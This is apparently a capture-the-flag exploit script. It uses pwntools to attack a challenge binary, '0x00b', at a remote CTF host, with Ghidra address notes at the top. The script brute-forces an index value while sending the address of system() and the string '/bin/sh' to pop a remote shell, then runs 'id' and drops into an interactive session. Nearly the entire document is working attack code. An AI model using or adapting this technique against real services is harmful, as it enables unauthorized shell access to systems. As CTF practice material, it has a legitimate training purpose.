from pwn import *
import time

"""
Ghidra
bss		00404060	00404107
functions 	00404080
user_input	004040a0
"""

elf=ELF("0x00b")
print(elf.symbols)




for i in range(1,10000): # bruteforce table
	for j in [-1,1]:
		io = remote("pwn.pwnme.fr",7004)
		io.sendline(p64(elf.symbols["system"]))
		io.sendline(b"1")
		io.sendline(b"/bin/sh")  # input_buffer
		print(str(i*j).encode())
		#io.sendline(b"0")
		io.sendline(str(i*j).encode())
		try:
			time.sleep(0.1)
			io.sendline(b"id")
		except:
			pass
		io.interactive()
		#io.sendline(str(i*j).encode())
		reply = io.recvall(timeout=1)
		print(i*j,reply)
		if reply.find(b"id")>-1:
			input()
		